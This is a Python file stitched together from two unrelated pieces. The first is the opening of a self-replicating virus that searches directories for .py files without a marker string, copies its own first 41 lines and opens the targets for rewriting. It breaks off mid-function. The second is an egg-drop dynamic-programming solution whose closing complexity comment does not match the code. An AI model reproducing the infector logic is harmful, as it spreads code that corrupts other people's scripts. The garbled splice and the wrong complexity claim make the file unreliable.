#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
import sys
 
MAX = 1000;
 
memo = [[-1 for i in range(MAX)] for j in range(MAX)] ;
 
def solveEggDrop(n, k):
 
    if (memo[n][k] != -1):
        return memo[n][k];
     
    if (k == 1 or k == 0):
        return k;
 
    if (n == 1):
        return k;
 
    min = sys.maxsize;
    res = 0;
 
    for x in range(1,k+1):
        res = max(solveEggDrop(n - 1, x - 1), solveEggDrop(n, k - x));
        if (res < min):
            min = res;
     
 
    memo[n][k] = min + 1;
    return min + 1;
 
# Driver code
if __name__ == '__main__':
    n = 2;
    k = 36;
    print(solveEggDrop(n, k));
     
# This code is contributed by gauravrajput1
'''
Time Complexity: O(n * log(k))
Space Complexity: O(n)
'''